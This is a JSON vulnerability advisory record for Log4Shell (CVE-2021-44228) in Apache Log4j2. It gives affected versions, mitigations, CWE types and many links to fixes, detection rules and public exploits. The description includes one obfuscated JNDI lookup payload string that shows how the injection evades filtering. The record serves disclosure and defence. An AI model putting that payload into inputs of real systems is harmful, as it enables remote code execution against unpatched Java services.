{
  "gsd": {
    "id": "GSD-2021-1002352",
    "vendor_name": "Apache",
    "product_name": [
      "Log4j",
      "Log4j2"
    ],
    "product_version": "<=2.14.1",
    "vulnerability_type": "CWE-502 Deserialization of Untrusted Data, CWE-400 Uncontrolled Resource Consumption, CWE-20 Improper Input Validation",
    "affected_component": "unspecified",
    "attack_vector": "network",
    "impact": "remote code execution",
    "credit": "",
    "references": [
      {
        "refsource": "EXPLOIT",
        "name": "https://twitter.com/stereotype32/status/1469313856229228544",
        "url": "https://twitter.com/stereotype32/status/1469313856229228544"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/",
        "url": "https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/"
      },
      {
        "refsource": "CONFIRM",
        "name": "Log4Shell: RCE 0-day exploit found in log4j2, a popular Java logging package",
        "url": "https://www.lunasec.io/docs/blog/log4j-zero-day/"
      },
      {
        "refsource": "EXPLOIT",
        "name": "https://github.com/tangxiaofeng7/apache-log4j-poc",
        "url": "https://github.com/tangxiaofeng7/apache-log4j-poc"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://news.ycombinator.com/item?id=29504755",
        "url": "https://news.ycombinator.com/item?id=29504755"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://twitter.com/P0rZ9/status/1468949890571337731",
        "url": "https://twitter.com/P0rZ9/status/1468949890571337731"
      },
      {
        "refsource": "WORKAROUND",
        "name": "https://github.com/apache/logging-log4j2/pull/608",
        "url": "https://github.com/apache/logging-log4j2/pull/608"
      },
      {
        "refsource": "FIX",
        "name": "https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.15.0/",
        "url": "https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.15.0/"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://issues.apache.org/jira/browse/LOG4J2-2109",
        "url": "https://issues.apache.org/jira/browse/LOG4J2-2109"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://old.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/",
        "url": "https://old.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://www.cisa.gov/uscert/ncas/current-activity/2021/12/10/apache-releases-log4j-version-2150-address-critical-rce",
        "url": "https://www.cisa.gov/uscert/ncas/current-activity/2021/12/10/apache-releases-log4j-version-2150-address-critical-rce"
      },
      {
        "refsource": "CONFIRM",
        "name": "http://mail-archives.us.apache.org/mod_mbox/www-announce/202112.mbox/%3C643bc702-4b46-411b-4980-1fcf637dbb11%40apache.org%3E",
        "url": "http://mail-archives.us.apache.org/mod_mbox/www-announce/202112.mbox/%3C643bc702-4b46-411b-4980-1fcf637dbb11%40apache.org%3E"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2021/2021-549032-10F2.html",
        "url": "https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2021/2021-549032-10F2.html"
      },
      {
        "refsource": "WORKAROUND",
        "name": "https://github.com/simonis/Log4jPatch",
        "url": "https://github.com/simonis/Log4jPatch"
      },
      {
        "refsource": "EXPLOITINFORMATION",
        "name": "https://github.com/YfryTchsGD/Log4jAttackSurface",
        "url": "https://github.com/YfryTchsGD/Log4jAttackSurface"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://twitter.com/halvarflake/status/1469318326929272835",
        "url": "https://twitter.com/halvarflake/status/1469318326929272835"
      },
      {
        "refsource": "DETECTION",
        "name": "https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b",
        "url": "https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b"
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://twitter.com/_JohnHammond/status/1469255402290401285",
        "url": "https://twitter.com/_JohnHammond/status/1469255402290401285"
      },
      {
        "refsource": "DOCUMENTATION",
        "name": "https://logging.apache.org/log4j/2.x/manual/lookups.html",
        "url": "https://logging.apache.org/log4j/2.x/manual/lookups.html"
      },
      {
        "refsource": "DOCUMENTATION",
        "name": "https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf",
        "url": "https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"
      },
      {
        "refsource": "EXPLOIT",
        "name": "https://twitter.com/aksquaretech/status/1469297067948347394",
        "url": "https://twitter.com/aksquaretech/status/1469297067948347394"
      },
      {
        "refsource": "WORKAROUND",
        "name": "https://rules.emergingthreatspro.com/open/",
        "url": "https://rules.emergingthreatspro.com/open/"
      },
      {
        "refsource": "FIX",
        "name": "RHSB-2021-009 Log4Shell - Remote Code Execution - log4j",
        "url": "https://access.redhat.com/security/vulnerabilities/RHSB-2021-009"
      },
      {
        "refsource": "FIX",
        "name": "https://www.suse.com/security/cve/CVE-2021-44228.html",
        "url": "https://www.suse.com/security/cve/CVE-2021-44228.html"
      },
      {
        "refsource": "FIX",
        "name": "https://security-tracker.debian.org/tracker/CVE-2021-44228",
        "url": "https://security-tracker.debian.org/tracker/CVE-2021-44228"
      },
      {
        "refsource": "FIX",
        "name": "https://ubuntu.com/security/CVE-2021-44228",
        "url": "https://ubuntu.com/security/CVE-2021-44228"
      },
      {
        "refsource": "CONFIRM",
        "name": "Log4j RCE: Emergency patch issued to plug critical auth-free code execution hole in widely-used logging utility",
        "url": "https://www.theregister.com/2021/12/10/log4j_remote_code_execution_vuln_patch_issued/"
      },
      {
        "refsource": "EXPLOIT",
        "name": "https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce",
        "url": "https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce"
      },
      {
        "refsource": "EXPLOIT",
        "name": "https://twitter.com/chvancooten/status/1469340927923826691",
        "url": "https://twitter.com/chvancooten/status/1469340927923826691"
      },
      {
        "refsource": "WORKAROUND",
        "name": "https://github.com/apache/logging-log4j2/pull/608",
        "url": "https://github.com/apache/logging-log4j2/pull/608"
      },
      {
        "refsource": "FIX",
        "name": "VMSA-2021-0028",
        "url": "https://www.vmware.com/security/advisories/VMSA-2021-0028.html"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://www.cnblogs.com/yyhuni/p/15088134.html",
        "url": "https://www.cnblogs.com/yyhuni/p/15088134.html"
      },
      {
        "refsource": "CONFIRM",
        "name": "CVE-2021-44228 – Log4j 2 Vulnerability Analysis",
        "url": "https://www.randori.com/blog/cve-2021-44228/"
      },
      {
        "refsource": "DETECTION",
        "name": "CVE-2021-44228-Log4Shell-Hashes",
        "url": "https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes"
      },
      {
        "refsource": "DETECTION",
        "name": "Using Anchore Enterprise to Detect and Prevent Log4Shell, the Log4j Zero-Day Vulnerability",
        "url": "https://anchore.com/blog/using-anchore-enterprise-to-detect-prevent-log4j-zero-day/"
      },
      {
        "refsource": "CONFIRM",
        "name": "How to detect the Log4j vulnerability in your applications",
        "url": "https://www.infoworld.com/article/3644492/how-to-detect-the-log4j-vulnerability-in-your-applications.html"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://developers.slashdot.org/story/21/12/10/2131259/new-zero-day-in-the-log4j-java-library-is-already-being-exploited",
        "url": "https://developers.slashdot.org/story/21/12/10/2131259/new-zero-day-in-the-log4j-java-library-is-already-being-exploited"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://www.zdnet.com/article/security-warning-new-zero-day-in-the-log4j-java-library-is-already-being-exploited/",
        "url": "https://www.zdnet.com/article/security-warning-new-zero-day-in-the-log4j-java-library-is-already-being-exploited/"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://blog.cloudflare.com/how-cloudflare-security-responded-to-log4j2-vulnerability/",
        "url": "https://blog.cloudflare.com/how-cloudflare-security-responded-to-log4j2-vulnerability/"
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/",
        "url": "https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/",
        "url": "https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/"
      },
      {
        "refsource": "CONFIRM",
        "name": "https://www.wired.com/story/log4j-flaw-hacking-internet/",
        "url": "https://www.wired.com/story/log4j-flaw-hacking-internet/"
      },
      {
        "refsource": "DETECTION",
        "name": "https://github.com/returntocorp/semgrep-rules/pull/1650/commits/ecfc32623eec718d61ec83b9196574f333191008/",
        "url": "https://github.com/returntocorp/semgrep-rules/pull/1650/commits/ecfc32623eec718d61ec83b9196574f333191008"
      }
    ],
    "reporter": "kurtseifried",
    "reporter_id": 582211,
    "notes": "",
    "description": "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints resulting in remote code execution against a wide variety of Java applications (e.g. anything logging user controlled strings such as web browser user agents, to chat functionality in Minecraft servers). An attacker who can inject information into a log message or log message parameter can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled (e.g. a user agent string substitution). From log4j 2.15.0 and later, this behavior has been disabled by default. In previous releases (>2.10) this behavior can be mitigated by setting system property \"log4j2.formatMsgNoLookups\" to “true” or by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) protects against remote code execution by defaulting \"com.sun.jndi.rmi.object.trustURLCodebase\" and \"com.sun.jndi.cosnaming.object.trustURLCodebase\" to \"false\". Please note that remote code execution is possible, e.g. \"${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}\". Exploits have been published on Twitter, Lunasec and GitHub including working exploits for Minecraft Servers (via the chat functionality). It is also reported that many large cloudd services and applications are affected (e.g. Apple, Tencent, Twitter, Steam, Amazon, etc. see the \"Log4jAttackSurface\" GitHub repo for additional information). CloudFlare has stated that they are now blocking this attack by default in their WAF rules and are looking to roll our protection for free customers as well. An unverified \"Log4jPatch\" hotfix that can be used to inject a Java agent into a running JVM process has been released as well (please ensure you audit the code before deploying). Exploitation detection rules and code has been released by Neo23x0 in GitHub gist e4c8b03ff8cdf1fa63b7d15db6e3860b. Snort and Suricata signatures have been released as well via emergingthreatspro. Please see the references links in the GSD data section for more information on these workarounds, exploits, signatures, etc. It has been reported that JDK versions greater than 6u211, 7u201, 8u191, and 11.0.1 are not affected by the LDAP attack vector. In these versions com.sun.jndi.ldap.object.trustURLCodebase is set to false meaning JNDI cannot load remote code using LDAP (see Lunasec blog entry)."
  },
  "cve.org": {
    "CVE_data_meta": {
      "ASSIGNER": "security@apache.org",
      "ID": "CVE-2021-44228",
      "STATE": "PUBLIC",
      "TITLE": "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints"
    },
    "affects": {
      "vendor": {
        "vendor_data": [
          {
            "product": {
              "product_data": [
                {
                  "product_name": "Apache Log4j",
                  "version": {
                    "version_data": [
                      {
                        "version_affected": "<=",
                        "version_name": "Apache Log4j 2",
                        "version_value": "2.14.1"
                      }
                    ]
                  }
                }
              ]
            },
            "vendor_name": "Apache Software Foundation"
          }
        ]
      }
    },
    "credit": [
      {
        "lang": "eng",
        "value": "This issue was discovered by Chen Zhaojun of Alibaba Cloud Security Team."
      }
    ],
    "data_format": "MITRE",
    "data_type": "CVE",
    "data_version": "4.0",
    "description": {
      "description_data": [
        {
          "lang": "eng",
          "value": "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. In previous releases (>2.10) this behavior can be mitigated by setting system property \"log4j2.formatMsgNoLookups\" to “true” or by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) protects against remote code execution by defaulting \"com.sun.jndi.rmi.object.trustURLCodebase\" and \"com.sun.jndi.cosnaming.object.trustURLCodebase\" to \"false\"."
        }
      ]
    },
    "generator": {
      "engine": "Vulnogram 0.0.9"
    },
    "impact": [
      {
        "other": "critical"
      }
    ],
    "problemtype": {
      "problemtype_data": [
        {
          "description": [
            {
              "lang": "eng",
              "value": "CWE-502 Deserialization of Untrusted Data"
            }
          ]
        },
        {
          "description": [
            {
              "lang": "eng",
              "value": "CWE-400 Uncontrolled Resource Consumption"
            }
          ]
        },
        {
          "description": [
            {
              "lang": "eng",
              "value": "CWE-20 Improper Input Validation"
            }
          ]
        }
      ]
    },
    "references": {
      "reference_data": [
        {
          "refsource": "MISC",
          "url": "https://logging.apache.org/log4j/2.x/security.html",
          "name": "https://logging.apache.org/log4j/2.x/security.html"
        },
        {
          "refsource": "MLIST",
          "name": "[oss-security] 20211210 CVE-2021-44228: Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints",
          "url": "http://www.openwall.com/lists/oss-security/2021/12/10/1"
        },
        {
          "refsource": "MLIST",
          "name": "[oss-security] 20211210 Re: CVE-2021-44228: Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints",
          "url": "http://www.openwall.com/lists/oss-security/2021/12/10/2"
        },
        {
          "refsource": "CONFIRM",
          "name": "https://security.netapp.com/advisory/ntap-20211210-0007/",
          "url": "https://security.netapp.com/advisory/ntap-20211210-0007/"
        },
        {
          "refsource": "MISC",
          "name": "http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html",
          "url": "http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html"
        },
        {
          "refsource": "CISCO",
          "name": "20211210 Vulnerability in Apache Log4j Library Affecting Cisco Products: December 2021",
          "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd"
        },
        {
          "refsource": "MLIST",
          "name": "[oss-security] 20211210 Re: CVE-2021-44228: Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints",
          "url": "http://www.openwall.com/lists/oss-security/2021/12/10/3"
        }
      ]
    },
    "source": {
      "discovery": "UNKNOWN"
    }
  }
}
